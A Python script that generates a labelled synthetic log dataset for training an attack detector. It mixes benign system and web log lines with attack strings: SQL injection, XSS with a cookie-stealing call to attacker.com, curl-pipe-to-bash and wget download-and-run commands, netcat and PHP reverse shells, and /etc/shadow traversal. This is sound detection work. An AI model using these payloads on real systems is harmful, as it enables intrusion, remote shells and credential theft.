import pandas as pd
import random
import os

# --- REAL-WORLD SECURITY DATA TEMPLATES ---
TEMPLATES = {
    'NORMAL': [
        "Oct 29 18:31:50 my-pc systemd[1]: Starting Service {}", "GET /api/v1/user/{} 200",
        "Nov 01 10:20:30 server sshd[123]: Accepted password for admin from 192.168.1.10",
        "INFO dfs.FSNamesystem: BLOCK* NameSystem.addStoredBlock: blockMap updated: blk_{}",
        "200 OK - Request processed for session id {}", "GET /static/images/logo.png 200",
        "PACMAN: synchronizing package lists", "Kernel: [123.456] usb 1-1: new high-speed USB device",
        "POST /login 302", "GET /favicon.ico 404", "CRON[1234]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)",
        "sudo:  admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update",
        "[2026-03-03T10:00:00+0530] [PACMAN] Running 'pacman -Syu'",
        "[2026-03-03T10:05:22+0530] [ALPM] transaction started",
        "[2026-03-03T10:05:25+0530] [ALPM] installed linux (6.1.20-1)",
        "[2026-03-03T10:10:00+0530] [ALPM-SCRIPTLET] Notice: Configuration updated successfully",
        "Mar  3 12:00:01 server CRON[1234]: (root) CMD ( /usr/lib/php/sessionclean )",
        "systemd[1]: Reached target Multi-User System.",
        "dbus-daemon[456]: [system] Activating via systemd: service name='org.freedesktop.nm_dispatcher'"
    ],
    'SQL_INJECTION': [
        "SELECT * FROM users WHERE id='{}'--", "admin' OR '1'='1", "DROP TABLE orders;", 
        "UNION SELECT NULL, username, password FROM members--", "' OR TRUE --",
        "'; EXEC sp_msforeachtable 'DROP TABLE ?'--", "GET /products.php?id=10 AND 1=1",
        "POST /search.php data=search=%27+OR+1%3D1--", "GET /news.php?id=-1+UNION+SELECT+1,2,3,4"
    ],
    'XSS': [
        "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", 
        "javascript:alert('XSS')", "<svg/onload=alert(1)>", "document.cookie",
        "GET /index.php?name=<script>window.location='http://attacker.com/steal?c='+document.cookie</script>",
        "POST /comment.php data=text=<iframe src=\"javascript:alert(`xss`)\">"
    ],
    'RCE_SYSTEM': [
        "system('cat /etc/passwd')", "exec('/bin/bash -i')", "eval(base64_decode('{}'))",
        "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)'",
        "curl http://attacker.com/shell.sh | bash", "wget http://malicious.com/virus -O /tmp/v && chmod +x /tmp/v && /tmp/v",
        "nc -e /bin/sh 10.0.0.1 4444", "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ],
    'BRUTE_FORCE': [
        "Failed password for root from 192.168.1.{}", "Invalid user admin from 10.0.0.{}", 
        "sshd: session closed for user guest", "Failed password for invalid user {}",
        "Jan 01 12:00:00 server sshd[123]: Failed password for root from 1.2.3.4 port 1234 ssh2",
        "POST /wp-login.php user=admin&pass=123456", "POST /api/auth user=root&token=invalid"
    ],
    'PATH_TRAVERSAL': [
        "../../etc/passwd", "../../../windows/win.ini", "/var/log/apache2/access.log", 
        "C:\\Windows\\System32\\drivers\\etc\\hosts", "..%2f..%2f..%2fetc%2fpasswd",
        "GET /download.php?file=../../../../../../etc/shadow", "GET /view?doc=/etc/hosts%00.pdf"
    ],
    'COMMAND_INJECTION': [
        "; cat /etc/passwd", "| id", "`whoami`", "$(ls /)", "&& ping -c 1 attacker.com",
        "GET /ping?host=8.8.8.8;cat+/etc/shadow", "POST /system data=cmd=ls+-la+/"
    ]
}

def generate_robust_data(filename, total=1500000):
    print(f"🚀 Generating {total:,} lines of Professional SOC Data...")
    logs, labels = [], []
    
    # 70% Normal, 30% Attack for better training balance
    attack_count = int(total * 0.30)
    normal_count = total - attack_count
    
    for _ in range(normal_count):
        t = random.choice(TEMPLATES['NORMAL'])
        logs.append(t.format(random.randint(1, 100000)))
        labels.append(0)
        
    attack_types = ['SQL_INJECTION', 'XSS', 'RCE_SYSTEM', 'BRUTE_FORCE', 'PATH_TRAVERSAL', 'COMMAND_INJECTION']
    for _ in range(attack_count):
        group = random.choice(attack_types)
        t = random.choice(TEMPLATES[group])
        logs.append(t.format(random.randint(1, 255)))
        labels.append(1)
        
    df = pd.DataFrame({'log_text': logs, 'label': labels}).sample(frac=1).reset_index(drop=True)
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    df.to_csv(filename, index=False)
    print(f"✅ Professional SOC dataset created: {filename}")

if __name__ == "__main__":
    generate_robust_data("future_proof_logs.csv")
